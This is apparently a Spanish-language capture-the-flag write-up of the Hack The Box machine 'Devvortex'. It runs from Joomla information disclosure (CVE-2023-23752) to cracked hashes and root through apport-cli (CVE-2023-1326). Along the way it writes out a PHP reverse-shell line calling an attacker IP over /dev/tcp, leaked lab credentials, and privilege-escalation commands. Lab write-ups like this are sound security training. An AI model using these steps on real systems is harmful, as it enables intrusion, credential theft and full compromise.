---
title: Devvortex - WriteUp
date: 'Tue, 03 Dec 2024 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Linux
tags:
  - joomla
  - cve-2023-23752
  - mysql
  - john
  - apport-cli
  - cve-2023-1326
  - htb
  - ctf
  - linux
image: /assets/img/cabeceras/2024-12-03-DEVVORTEX-WRITEUP.png
description: >-
  Devvortex es una máquina Linux de fácil dificultad que cuenta con un CMS de
  Joomla que es vulnerable a la divulgación de información. El acceso al archivo
  de configuración del servicio revela credenciales de texto sin formato que
  conducen al acceso administrativo a la instancia de Joomla.
---

{% include machine-info.html
  machine="Devvortex"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Devvortex](/assets/img/htb-writeups/Pasted-image-20231208225239.png)

## Enumeración

### NMAP

```bash
# Nmap 7.94SVN scan initiated Fri Dec  8 22:49:36 2023 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.47.169
Nmap scan report for 10.129.47.169
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos `devvortex.htb` al archivo hosts.

### Análisis Web

![Web principal](/assets/img/htb-writeups/Pasted-image-20231208225239.png)

Examinamos los botones "Contact Us" y el formulario de envío, pero no hacen nada:

![Formulario](/assets/img/htb-writeups/Pasted-image-20231209101546.png)

Es una página estática.

### Fuzzing

```bash
$ gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![Gobuster](/assets/img/htb-writeups/Pasted-image-20231209102636.png)

No ha encontrado nada. Vamos a escanear subdominios:

```bash
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://devvortex.htb' -H "Host: FUZZ.devvortex.htb" --hc 302
```

![Wfuzz](/assets/img/htb-writeups/Pasted-image-20231209104703.png)

Encontramos el subdominio `dev`. Agregamos `dev.devvortex.htb` al archivo hosts.

![Dev subdomain](/assets/img/htb-writeups/Pasted-image-20231209111005.png)

Inspeccionando el código fuente vemos la ruta de una imagen que contiene la palabra `cassiopeia`:

![Cassiopeia](/assets/img/htb-writeups/Pasted-image-20231209111537.png)

Buscando por internet descubrimos que es un plugin de Joomla. Confirmamos accediendo al panel de administración:

```
http://dev.devvortex.htb/administrator
```

![Joomla admin](/assets/img/htb-writeups/Pasted-image-20231209113146.png)

Usamos `joomscan` para enumerar:

```bash
$ joomscan --url http://dev.devvortex.htb

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/
```

## Explotación - CVE-2023-23752

La versión de Joomla 4.2.6 es vulnerable a CVE-2023-23752 (Information Disclosure).

Usamos el PoC de: https://github.com/adhikara13/CVE-2023-23752

![CVE exploit](/assets/img/htb-writeups/Pasted-image-20231209120100.png)

```bash
$ python3 CVE-2023-23752.py -u dev.devvortex.htb -o resultado.txt
...
[+] => Vulnerable dev.devvortex.htb
User: lewis Password: 'P4ntherg0t1n5r3c0n##' Database: joomla
```

Credenciales obtenidas:

```
lewis:P4ntherg0t1n5r3c0n##
```

Accedemos al panel de administración:

![Login](/assets/img/htb-writeups/Pasted-image-20231209120413.png)

![Dashboard](/assets/img/htb-writeups/Pasted-image-20231209120548.png)

### Reverse Shell via Template

Modificamos el archivo `login.php` de la plantilla administrativa:

**System > Administrator Templates > Atum Details and Files > login.php**

Agregamos en la línea 2:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.14.68/4444 0>&1"');
```

![Template edit](/assets/img/htb-writeups/Pasted-image-20231209122543.png)

Nos ponemos en escucha:

```bash
$ nc -nlvp 4444
```

Accedemos a la URL del archivo modificado:

```
http://dev.devvortex.htb/administrator/templates/atum/login.php
```

![Shell](/assets/img/htb-writeups/Pasted-image-20231209122947.png)

## Movimiento Lateral

Solo hay un usuario además de root: `logan`

![Users](/assets/img/htb-writeups/Pasted-image-20231209124130.png)

Probamos las credenciales de lewis para conectar a la base de datos:

```bash
$ mysql -u lewis -p
```

![MySQL](/assets/img/htb-writeups/Pasted-image-20231209124215.png)

Extraemos los hashes:

```sql
mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

Crackeamos el hash de logan:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![John](/assets/img/htb-writeups/Pasted-image-20231209124721.png)

Credenciales de logan:

```
logan:tequieromucho
```

```bash
$ su logan
Password: tequieromucho
logan@devvortex:~$
```

## Escalada de Privilegios - CVE-2023-1326

Hacemos `sudo -l`:

![sudo -l](/assets/img/htb-writeups/Pasted-image-20231209125525.png)

El binario `apport-cli` es vulnerable a CVE-2023-1326 (ejecución de comando en less).

PoC: https://github.com/diego-tella/CVE-2023-1326-PoC

Creamos un archivo `.apport` y ejecutamos:

```bash
$ sudo /usr/bin/apport-cli -c ./file.apport less
```

```
*** Send problem report to the developers?
What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```

Respondemos `V` para ver el archivo y entrar en consola `less`. Ejecutamos:

```
:!/bin/sh
# whoami
root
```

Máquina comprometida!

---

**Última actualización**: 2024-12-03<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
